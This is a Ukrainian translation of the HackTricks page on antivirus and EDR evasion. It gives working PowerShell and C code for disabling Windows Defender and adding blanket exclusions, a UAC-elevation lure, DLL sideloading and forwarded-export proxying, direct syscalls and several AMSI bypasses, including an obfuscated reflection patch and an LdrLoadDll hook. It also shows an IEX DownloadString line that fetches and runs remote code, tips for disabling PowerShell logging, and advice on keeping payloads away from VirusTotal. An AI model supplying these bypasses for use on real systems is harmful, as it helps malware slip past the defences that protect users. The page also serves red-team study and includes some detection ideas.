# Обхід антивіруса (AV)

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку спочатку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинити Defender

- [defendnot](https://github.com/es3n1n/defendnot): інструмент для зупинки роботи Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): інструмент для зупинки роботи Windows Defender, що маскується під інший AV.
- [Вимкнути Defender, якщо ви адміністратор](basic-powershell-for-pentesters/README.md)

### Приманка у стилі інсталятора з UAC перед втручанням у роботу Defender

Публічні лоадери, що маскуються під чити для ігор, часто постачаються як непідписані інсталятори Node.js/Nexe, які спочатку **запитують у користувача підвищення прав**, а вже потім вимикають Defender. Схема проста:

1. Перевірити наявність прав адміністратора за допомогою `net session`. Команда завершується успішно лише тоді, коли користувач має права адміністратора, тож помилка означає, що лоадер запущено від імені звичайного користувача.
2. Негайно перезапустити себе з дієсловом `RunAs`, щоб викликати очікуване підтвердження UAC і зберегти початковий командний рядок.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Жертви вже вважають, що встановлюють «cracked»-програмне забезпечення, тому зазвичай погоджуються із запитом, надаючи malware потрібні права для зміни політики Defender.<sup>[[26]](#references)</sup>

### Широкі виключення `MpPreference` для кожної літери диска

Отримавши підвищені привілеї, ланцюжки на кшталт GachiLoader створюють якомога більше сліпих зон у Defender, а не вимикають службу повністю. Спочатку loader завершує роботу GUI-сторожа (`taskkill /F /IM SecHealthUI.exe`), а потім додає **надзвичайно широкі виключення**, щоб профілі всіх користувачів, системні каталоги та знімні диски не сканувалися:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Цикл проходить по кожній змонтованій файловій системі (D:\, E:\, USB-накопичувачі тощо), тому **будь-який майбутній payload, розміщений будь-де на диску, буде проігноровано**.
- Виключення розширення `.sys` закладає можливість на майбутнє — зловмисники залишають собі варіант пізніше завантажувати непідписані драйвери, не взаємодіючи повторно з Defender.
- Усі зміни вносяться в `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, тож наступні етапи можуть підтвердити, що виключення збереглися, або розширити їх без повторного виклику UAC.

Оскільки службу Defender не зупиняють, наївні перевірки стану й надалі повідомляють, що «антивірус активний», хоча перевірка в реальному часі не охоплює ці шляхи.<sup>[[26]](#references)</sup>

## **Методологія обходу AV**

Наразі AV використовують різні методи перевірки файлів на шкідливість: статичне виявлення, динамічний аналіз, а в просунутіших EDR — поведінковий аналіз.

### **Статичне виявлення**

Статичне виявлення працює шляхом пошуку відомих шкідливих рядків або масивів байтів у бінарному файлі чи скрипті, а також отримання інформації безпосередньо з файлу (наприклад, опису файлу, назви компанії, цифрових підписів, значка, контрольної суми тощо). Це означає, що використання відомих публічних інструментів може швидше призвести до виявлення, оскільки їх, імовірно, уже проаналізували й позначили як шкідливі. Є кілька способів обійти такий тип виявлення:

- **Шифрування**

Якщо зашифрувати бінарний файл, AV не зможе виявити вашу програму, але знадобиться певний loader, щоб розшифрувати й запустити програму в пам’яті.

- **Обфускація**

Іноді достатньо змінити кілька рядків у бінарному файлі чи скрипті, щоб AV його не виявив, але залежно від того, що саме ви намагаєтеся обфускувати, це може зайняти багато часу.

- **Власні інструменти**

Якщо розробити власні інструменти, для них не буде відомих шкідливих сигнатур, але це потребує багато часу й зусиль.

> [!TIP]
> Хороший інструмент для перевірки статичного виявлення Windows Defender — [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він розбиває файл на кілька сегментів і просить Defender просканувати кожен окремо, щоб визначити, які саме рядки або байти у вашому бінарному файлі позначено.

Наполегливо раджу переглянути цей [плейлист YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичний обхід AV.

### **Динамічний аналіз**

Динамічний аналіз — це коли AV запускає ваш бінарний файл у sandbox і стежить за шкідливою активністю (наприклад, спробами розшифрувати й прочитати паролі з браузера, створити minidump LSASS тощо). З цим може бути трохи складніше працювати, але ось кілька способів обійти sandbox.

- **Очікування перед виконанням** Залежно від реалізації, це може бути чудовим способом обійти динамічний аналіз AV. AV має дуже мало часу на сканування файлів, щоб не переривати роботу користувача, тому тривале очікування може завадити аналізу бінарних файлів. Проблема в тому, що багато sandbox в AV можуть просто пропустити очікування — залежно від того, як воно реалізоване.
- **Перевірка ресурсів машини** Зазвичай sandbox мають дуже мало ресурсів (наприклад, < 2GB RAM), інакше вони могли б сповільнити роботу машини користувача. Тут також можна проявити винахідливість: наприклад, перевірити температуру CPU або навіть швидкість обертання вентиляторів — у sandbox може бути реалізовано не все.
- **Перевірки, специфічні для машини** Якщо ви хочете націлитися на користувача, чия робоча станція приєднана до домену "contoso.local", можна перевірити домен комп’ютера й порівняти його із заданим. Якщо він не збігається, програма може завершитися.

Виявилося, що computername комп’ютера в Microsoft Defender Sandbox — HAL9TH. Тож перед детонацією можна перевірити ім’я комп’ютера у своєму malware: якщо воно збігається з HAL9TH, це означає, що ви перебуваєте в sandbox Defender, і програма може завершитися.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ще кілька чудових порад від [@mgeeky](https://twitter.com/mariuszbit) щодо протидії sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> канал #malware-dev</p></figcaption></figure>

Як ми вже згадували в цій публікації, **публічні інструменти** зрештою **будуть виявлені**, тож варто поставити собі запитання:

Наприклад, якщо вам потрібно створити дамп LSASS, **чи справді потрібно використовувати mimikatz**? Чи можна скористатися іншим, менш відомим проєктом, який також створює дамп LSASS?

Імовірно, правильна відповідь — другий варіант. Візьмімо mimikatz як приклад: це, мабуть, один із найбільш позначених AV та EDR шкідливих інструментів, якщо не найбільш позначений. Сам проєкт дуже крутий, але з ним також неймовірно складно обійти AV, тож просто пошукайте альтернативи для виконання потрібного завдання.

> [!TIP]
> Змінюючи payload для обходу виявлення, обов’язково **вимкніть автоматичне надсилання зразків** у Defender і, будь ласка, серйозно, **НЕ ЗАВАНТАЖУЙТЕ ФАЙЛИ НА VIRUSTOTAL**, якщо ваша мета — досягти тривалого обходу виявлення. Щоб перевірити, чи виявляє певний AV ваш payload, установіть його на VM, спробуйте вимкнути автоматичне надсилання зразків і тестуйте там, доки не будете задоволені результатом.

## EXEs vs DLLs

Коли це можливо, завжди **віддавайте перевагу DLL для обходу виявлення**. З мого досвіду, файли DLL зазвичай **виявляють і аналізують значно рідше**, тож у деяких випадках це простий спосіб уникнути виявлення (якщо ваш payload можна запускати як DLL, звісно).

Як бачимо на цьому зображенні, DLL Payload від Havoc має рівень виявлення 4/26 на antiscan.me, тоді як у EXE payload цей показник становить 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>порівняння на antiscan.me звичайного Havoc EXE payload зі звичайним Havoc DLL</p></figcaption></figure>

Тепер розглянемо кілька прийомів для файлів DLL, які допоможуть стати значно непомітнішими.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який застосовує loader, розміщуючи вразливу програму та шкідливий payload(и) поруч.

Перевірити програми, вразливі до DLL Sideloading, можна за допомогою [Siofra](https://github.com/Cybereason/siofra) та такого powershell-скрипту:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ця команда виведе список програм у "C:\Program Files\\", вразливих до DLL hijacking, а також файли DLL, які вони намагаються завантажити.

Наполегливо рекомендую **самостійно досліджувати програми, придатні для DLL Hijacking/Sideloading**. За належного виконання ця техніка досить непомітна, але якщо використовувати загальновідомі програми для DLL Sideloading, вас можуть легко виявити.

Якщо просто помістити шкідливу DLL з назвою, яку програма очікує завантажити, це не призведе до завантаження вашого payload, оскільки програмі потрібні певні функції всередині цієї DLL. Щоб вирішити цю проблему, ми скористаємося іншою технікою — **DLL Proxying/Forwarding**.

**DLL Proxying** перенаправляє виклики програми з проксі-DLL (шкідливої) до оригінальної DLL, зберігаючи функціональність програми та даючи змогу виконати ваш payload.

Я скористаюся проєктом [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, яких я дотримувався:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Остання команда надасть нам 2 файли: шаблон вихідного коду DLL і оригінальну DLL зі зміненою назвою.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Ось результати:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)), і proxy DLL мають рівень виявлення 0/26 на [antiscan.me](https://antiscan.me)! Вважаю це успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Наполегливо рекомендую** переглянути [запис трансляції S3cur3Th1sSh1t на Twitch](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [відео ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб дізнатися більше про те, що ми обговорили.

### Зловживання forwarded exports (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які насправді є «forwarders»: замість посилання на код запис експорту містить ASCII-рядок у форматі `TargetDll.TargetFunc`. Коли викликається функція експорту, Windows loader:

- Завантажує `TargetDll`, якщо вона ще не завантажена
- Знаходить у ній `TargetFunc`

Важливі особливості:
- Якщо `TargetDll` є KnownDLL, вона надається із захищеного простору імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, який включає каталог модуля, що виконує перенаправлення.

Це дає змогу застосувати непрямий примітив sideloading: знайти підписану DLL, яка експортує функцію, перенаправлену до модуля з назвою, що не є KnownDLL, а потім розмістити цю підписану DLL поруч із контрольованою зловмисником DLL, названою точно так само, як цільовий модуль у перенаправленні. Під час виклику перенаправленого експорту loader обробляє перенаправлення та завантажує вашу DLL із того самого каталогу, виконуючи ваш DllMain.<sup>[[13]](#references)</sup>

Приклад, зафіксований у Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` не є KnownDLL, тому її знаходять у звичайному порядку пошуку.

PoC (копіювання та вставлення):
1) Скопіюйте підписану системну DLL до папки, доступної для запису.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Розмістіть шкідливий `NCRYPTPROV.dll` у тій самій папці. Для виконання коду достатньо мінімальної `DllMain`; щоб викликати `DllMain`, не потрібно реалізовувати функцію, на яку переспрямовується виклик.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Активуйте пересилання за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Спостережувана поведінка:
- rundll32 (підписаний) завантажує side-by-side `keyiso.dll` (підписаний)
- Під час пошуку `KeyIsoSetAuditingInterface` завантажувач переходить за forward до `NCRYPTPROV.SetAuditingInterface`
- Потім завантажувач завантажує `NCRYPTPROV.dll` із `C:\test` і виконує його `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, помилка «missing API» з’явиться лише після виконання `DllMain`

Поради з пошуку:
- Зосередьтеся на forwarded exports, цільовий модуль яких не є KnownDLL. Список KnownDLLs наведено в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Перерахувати forwarded exports можна за допомогою таких інструментів:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте інвентаризацію форвардерів Windows 11, щоб знайти відповідні варіанти: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ідеї щодо виявлення/захисту:
- Відстежуйте LOLBins (наприклад, rundll32.exe), які завантажують підписані DLL із несистемних шляхів, а потім завантажують із цієї директорії DLL, що не є KnownDLLs, із такою самою базовою назвою
- Сповіщайте про ланцюжки процесів/модулів на кшталт: `rundll32.exe` → несистемний `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачам
- Застосовуйте політики цілісності коду (WDAC/AppLocker) і забороняйте запис і виконання в директоріях програм

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Ви можете використовувати Freeze, щоб непомітно завантажувати й виконувати свій shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion — це гра в кішки-мишки: те, що працює сьогодні, завтра можуть виявити. Тому ніколи не покладайтеся лише на один інструмент; якщо можливо, комбінуйте кілька технік evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR часто встановлюють **user-mode inline hooks** на syscall stubs у `ntdll.dll`. Щоб обійти ці hooks, можна згенерувати stubs для **direct** або **indirect** syscalls, які завантажують правильний **SSN** (System Service Number) і переходять у kernel mode, не виконуючи hooked export entrypoint.<sup>[[32]](#references)</sup>

**Варіанти виклику:**
- **Direct (embedded)**: додати інструкцію `syscall`/`sysenter`/`SVC #0` у згенерований stub (без звернення до експорту `ntdll`).
- **Indirect**: перейти до наявного `syscall` gadget усередині `ntdll`, щоб перехід у kernel mode виглядав так, ніби він походить із `ntdll` (корисно для evasion на основі евристик); **randomized indirect** вибирає gadget із набору для кожного виклику.
- **Egg-hunt**: уникнути вбудовування статичної послідовності opcode `0F 05` на диску; знайти послідовність syscall під час виконання.

**Стратегії визначення SSN, стійкі до hooks:**
- **FreshyCalls (VA sort)**: визначати SSN, сортуючи syscall stubs за віртуальними адресами, а не зчитуючи байти stub.
- **SyscallsFromDisk**: відобразити чистий `\KnownDlls\ntdll.dll`, зчитати SSN із його `.text`, а потім скасувати відображення (обходить усі hooks у пам’яті).
- **RecycledGate**: поєднати визначення SSN через сортування VA з перевіркою opcode, якщо stub чистий; якщо він hooked — перейти до визначення через VA.
- **HW Breakpoint**: встановити DR0 на інструкцію `syscall` і використати VEH, щоб під час виконання отримати SSN з `EAX`, не аналізуючи hooked bytes.

Приклад використання SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI було створено для запобігання "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку AV могли сканувати лише **файли на диску**, тож якби вам вдалося виконати payload **безпосередньо в пам’яті**, AV не зміг би цьому завадити, оскільки не мав достатньої видимості.

Функцію AMSI інтегровано в такі компоненти Windows:

- User Account Control, або UAC (підвищення привілеїв EXE, COM, MSI або встановлення ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічне виконання коду)
- Windows Script Host (wscript.exe і cscript.exe)
- JavaScript і VBScript
- Макроси Office VBA

Це дає змогу антивірусним рішенням перевіряти поведінку скриптів, надаючи їхній вміст у незашифрованому й не обфускованому вигляді.

Виконання `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` спричинить таке сповіщення у Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, що він додає префікс `amsi:`, а потім шлях до виконуваного файла, з якого запущено скрипт; у цьому випадку це powershell.exe.

Ми не скидали жодного файла на диск, але все одно були виявлені в пам’яті через AMSI.

Крім того, починаючи з **.NET 4.8**, код C# також проходить перевірку AMSI. Це стосується навіть `Assembly.Load(byte[])` для завантаження коду, який виконуватиметься в пам’яті. Тому для виконання в пам’яті, якщо ви хочете обійти AMSI, рекомендується використовувати нижчі версії .NET (наприклад, 4.7.2 або нижче).

Є кілька способів обійти AMSI:

- **Обфускація**

Оскільки AMSI переважно використовує статичне виявлення, зміна скриптів, які ви намагаєтеся завантажити, може бути ефективним способом уникнути виявлення.

Однак AMSI здатна знімати обфускацію зі скриптів, навіть якщо вони мають кілька рівнів обфускації, тож це може бути невдалим варіантом — залежно від того, як саме її застосовано. Через це обхід не такий простий. Іноді достатньо змінити кілька назв змінних, але це залежить від того, наскільки щось уже потрапило під виявлення.

- **AMSI Bypass**

Оскільки AMSI реалізовано через завантаження DLL у процес powershell (а також cscript.exe, wscript.exe тощо), її можна легко підмінити навіть від імені користувача без привілеїв. Через цей недолік реалізації AMSI дослідники знайшли кілька способів обходити сканування AMSI.

**Примусове спричинення помилки**

Якщо змусити ініціалізацію AMSI завершитися помилкою (amsiInitFailed), сканування поточного процесу не запускатиметься. Спочатку про це повідомив [Matt Graeber](https://twitter.com/mattifestation), після чого Microsoft розробила сигнатуру, щоб запобігти ширшому використанню цього методу.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Усе, що знадобилося, — один рядок коду PowerShell, щоб зробити AMSI непридатним для використання в поточному процесі PowerShell. Звісно, сам AMSI позначив цей рядок, тож для використання цієї техніки його потрібно дещо змінити.

Ось модифікований обхід AMSI, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Майте на увазі: щойно цей допис вийде, його, ймовірно, позначать, тож не публікуйте код, якщо плануєте залишитися непоміченими.

**Memory Patching**

Цю техніку вперше виявив [@RastaMouse](https://twitter.com/_RastaMouse/). Вона передбачає пошук адреси функції "AmsiScanBuffer" у amsi.dll (відповідає за сканування введених користувачем даних) і перезапис її інструкціями, які повертають код E_INVALIDARG. У такий спосіб результат фактичного сканування буде 0, що інтерпретується як чистий результат.

> [!TIP]
> Докладніше про це читайте тут: [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/).

Існує також багато інших технік обходу AMSI за допомогою powershell. Дізнайтеся про них більше на [**цій сторінці**](basic-powershell-for-pentesters/index.html#amsi-bypass) і в [**цьому репозиторії**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Блокування AMSI через запобігання завантаженню amsi.dll (хук LdrLoadDll)

AMSI ініціалізується лише після завантаження `amsi.dll` у поточний процес. Надійний обхід, незалежний від мови програмування, полягає у встановленні хука в режимі користувача на `ntdll!LdrLoadDll`, який повертає помилку, якщо запитаний модуль — `amsi.dll`. У результаті AMSI не завантажується, і для цього процесу сканування не відбувається.<sup>[[23]](#references)</sup>

Загальна схема реалізації (псевдокод x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Примітки
- Працює з PowerShell, WScript/CScript і власними loaders (з усім, що за інших умов завантажувало б AMSI).
- Поєднуйте з передаванням скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути довгих артефактів у командному рядку.
- Використовувалося loaders, запущеними через LOLBins (наприклад, `regsvr32`, що викликає `DllRegisterServer`).

Інструмент **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** також генерує скрипт для обходу AMSI.
Інструмент **[https://amsibypass.com/](https://amsibypass.com/)** також генерує скрипт для обходу AMSI, який уникає сигнатурного виявлення за допомогою рандомізованих визначених користувачем функцій, змінних і символьних виразів, а також випадково змінює регістр символів у ключових словах PowerShell.

**Видалення виявленої сигнатури**

Для видалення виявленої сигнатури AMSI з пам’яті поточного процесу можна скористатися такими інструментами, як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** і **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**. Цей інструмент сканує пам’ять поточного процесу, шукає сигнатуру AMSI, а потім перезаписує її інструкціями NOP, фактично видаляючи її з пам’яті.

**Продукти AV/EDR, що використовують AMSI**

Список продуктів AV/EDR, що використовують AMSI, можна знайти тут: **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використання PowerShell версії 2**
Якщо використовувати PowerShell версії 2, AMSI не завантажиться, тож можна запускати скрипти без сканування AMSI. Ось як це зробити:

```bash
powershell.exe -version 2
```

## Журналювання PS

Журналювання PowerShell — це функція, яка дає змогу записувати всі команди PowerShell, виконані в системі. Це може бути корисним для аудиту й усунення несправностей, але також може стати **проблемою для атакувальників, які хочуть уникнути виявлення**.

Щоб обійти журналювання PowerShell, можна скористатися такими методами:

- **Вимкнути транскрибування PowerShell і журналювання модулів**: для цього можна скористатися таким інструментом, як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Використовувати PowerShell версії 2**: якщо використовувати PowerShell версії 2, AMSI не завантажуватиметься, тож скрипти можна запускати без сканування AMSI. Це можна зробити так: `powershell.exe -version 2`
- **Використовувати некерований сеанс PowerShell**: скористайтеся [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб розмістити PowerShell без запуску `powershell.exe` (цей підхід використовує `powerpick` у Cobalt Strike). Це обходить засоби контролю, прив’язані саме до процесу `powershell.exe`, але саме по собі не вимикає AMSI, Script Block Logging чи інші засоби захисту PowerShell; охоплення залежить від середовища виконання та реалізації хоста.


## Обфускація

> [!TIP]
> Деякі методи обфускації передбачають шифрування даних, що підвищить ентропію бінарного файла й полегшить його виявлення засобами AV та EDR. Будьте обережні й, можливо, застосовуйте шифрування лише до окремих частин коду, які є чутливими або мають бути приховані.

### Деобфускація захищених ConfuserEx бінарних файлів .NET

Під час аналізу malware, що використовує ConfuserEx 2 (або комерційні форки), часто доводиться мати справу з кількома рівнями захисту, які блокують декомпілятори та пісочниці. Наведений нижче робочий процес надійно **відновлює майже оригінальний IL**, який потім можна декомпілювати в C# за допомогою таких інструментів, як dnSpy або ILSpy.<sup>[[10]](#references)</sup>

1.  Видалення захисту від підміни – ConfuserEx шифрує кожне *тіло методу* й розшифровує його всередині статичного конструктора *модуля* (`<Module>.cctor`). Він також змінює контрольну суму PE, тому будь-яка модифікація призведе до аварійного завершення бінарного файла. Використайте **AntiTamperKiller**, щоб знайти зашифровані таблиці метаданих, відновити ключі XOR і переписати чисту збірку:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Вивід містить 6 параметрів захисту від втручання (`key0-key3`, `nameHash`, `internKey`), які можуть стати в пригоді під час створення власного unpacker.

2.  Відновлення символів / потоку керування — передайте *чистий* файл у **de4dot-cex** (форк de4dot із підтримкою ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Прапорці:
     • `-p crx` – вибрати профіль ConfuserEx 2
     • de4dot скасує сплощення потоку керування, відновить оригінальні простори імен, класи та назви змінних, а також розшифрує рядки-константи.

3.  Proxy-call stripping – ConfuserEx замінює прямі виклики методів легковаговими обгортками (так званими *proxy calls*), щоб ще більше ускладнити декомпіляцію. Видаліть їх за допомогою **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Після цього кроку ви маєте побачити звичайні API .NET, як-от `Convert.FromBase64String` або `AES.Create()`, замість непрозорих функцій-обгорток (`Class8.smethod_10`, …).

4.  Ручне очищення — запустіть отриманий бінарний файл у dnSpy та пошукайте великі блоки Base64 або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти *справжній* payload. Часто malware зберігає його як масив байтів із кодуванням TLV, ініціалізований усередині `<Module>.byte_0`.

Цей ланцюжок відновлює потік виконання, **не запускаючи** шкідливий зразок, — це корисно під час роботи на ізольованій робочій станції.

> 🛈  ConfuserEx створює користувацький атрибут `ConfusedByAttribute`, який можна використовувати як IOC для автоматичного первинного аналізу зразків.

#### Однорядкова команда
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати open-source fork набору засобів компіляції [LLVM](http://www.llvm.org/), який забезпечує підвищену безпеку програмного забезпечення за допомогою [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) і захисту від підробки.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації обфускованого коду під час компіляції без зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар обфускованих операцій, згенерованих за допомогою фреймворку метапрограмування шаблонів C++, що трохи ускладнить життя тому, хто захоче зламати застосунок.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — це x64 binary obfuscator, здатний обфускувати різні PE-файли, зокрема .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — це простий рушій метаморфного коду для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це фреймворк для дрібнозернистої обфускації коду мов, підтримуваних LLVM, із застосуванням ROP (return-oriented programming). ROPfuscator обфускує програму на рівні асемблерного коду, перетворюючи звичайні інструкції на ROP-ланцюжки та руйнуючи наше звичне уявлення про нормальний потік керування.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — це .NET PE Crypter, написаний на Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor може перетворювати наявні EXE/DLL на shellcode, а потім завантажувати їх

### Самомаскування окремих функцій за допомогою компілятора LLVM

